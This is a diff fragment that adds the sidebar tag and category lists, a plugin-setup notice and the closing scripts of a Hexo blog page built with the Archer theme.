+        <span class="sidebar-tag-name" data-tags="Github"><span class="iconfont-archer">&#xe606;</span>Github</span>
+    
+        <span class="sidebar-tag-name" data-tags="Hibernate"><span class="iconfont-archer">&#xe606;</span>Hibernate</span>
+    
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="Jetty"><span class="iconfont-archer">&#xe606;</span>Jetty</span>
+    
+        <span class="sidebar-tag-name" data-tags="Markdown"><span class="iconfont-archer">&#xe606;</span>Markdown</span>
+    
+        <span class="sidebar-tag-name" data-tags="Maven"><span class="iconfont-archer">&#xe606;</span>Maven</span>
+    
+        <span class="sidebar-tag-name" data-tags="SQL"><span class="iconfont-archer">&#xe606;</span>SQL</span>
+    
+        <span class="sidebar-tag-name" data-tags="SSL"><span class="iconfont-archer">&#xe606;</span>SSL</span>
+    
+        <span class="sidebar-tag-name" data-tags="Shell"><span class="iconfont-archer">&#xe606;</span>Shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="Vue"><span class="iconfont-archer">&#xe606;</span>Vue</span>
+    
+        <span class="sidebar-tag-name" data-tags="Xcode"><span class="iconfont-archer">&#xe606;</span>Xcode</span>
+    
+        <span class="sidebar-tag-name" data-tags="iOS"><span class="iconfont-archer">&#xe606;</span>iOS</span>
+    
+        <span class="sidebar-tag-name" data-tags="Test"><span class="iconfont-archer">&#xe606;</span>Test</span>
+    
+        <span class="sidebar-tag-name" data-tags="Wechat"><span class="iconfont-archer">&#xe606;</span>Wechat</span>
+    
+        <span class="sidebar-tag-name" data-tags="Zookeeper"><span class="iconfont-archer">&#xe606;</span>Zookeeper</span>
+    
+        <span class="sidebar-tag-name" data-tags="狼人杀"><span class="iconfont-archer">&#xe606;</span>狼人杀</span>
+    
+        <span class="sidebar-tag-name" data-tags="Spring Cloud"><span class="iconfont-archer">&#xe606;</span>Spring Cloud</span>
+    
+        <span class="sidebar-tag-name" data-tags="安全"><span class="iconfont-archer">&#xe606;</span>安全</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Tech"><span class="iconfont-archer">&#xe60a;</span>Tech</span>
+    
+        <span class="sidebar-category-name" data-categories="Game"><span class="iconfont-archer">&#xe60a;</span>Game</span>
+    
+        <span class="sidebar-category-name" data-categories="安全"><span class="iconfont-archer">&#xe60a;</span>安全</span>
+    
+        <span class="sidebar-category-name" data-categories="架构"><span class="iconfont-archer">&#xe60a;</span>架构</span>
+    
+        <span class="sidebar-category-name" data-categories="Git"><span class="iconfont-archer">&#xe60a;</span>Git</span>
+    
+        <span class="sidebar-category-name" data-categories="数据库"><span class="iconfont-archer">&#xe60a;</span>数据库</span>
+    
+        <span class="sidebar-category-name" data-categories="Java"><span class="iconfont-archer">&#xe60a;</span>Java</span>
+    
+        <span class="sidebar-category-name" data-categories="构建-部署"><span class="iconfont-archer">&#xe60a;</span>构建-部署</span>
+    
+        <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
+    
+        <span class="sidebar-category-name" data-categories="前端"><span class="iconfont-archer">&#xe60a;</span>前端</span>
+    
+        <span class="sidebar-category-name" data-categories="iOS"><span class="iconfont-archer">&#xe60a;</span>iOS</span>
+    
+        <span class="sidebar-category-name" data-categories="测试"><span class="iconfont-archer">&#xe60a;</span>测试</span>
+    
+        <span class="sidebar-category-name" data-categories="分布式系统"><span class="iconfont-archer">&#xe60a;</span>分布式系统</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: '/',
+        author: 'Zhilehuo'
+    }
+</script>
+    <!-- busuanzi  -->
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+    
+    </body>
+</html>
+
+
